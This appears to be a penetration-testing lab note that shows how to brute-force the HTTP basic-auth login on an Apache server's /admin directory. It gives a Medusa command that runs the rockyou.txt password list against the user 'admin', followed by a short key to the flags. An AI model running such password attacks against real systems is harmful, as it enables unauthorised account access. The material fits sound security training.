Target: Apache webserver

We will attempt to gain access to **/admin** using rockyou.txt

Launch and intiate medusa attack against htaccess-protected url:
`medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http
-m DIR:/admin`

**-h** target host
**-u** username
**-p** PW list
**-M** Authentication Scheme
**-m** Target url

View medus target protocol modules:
`medusa -d`

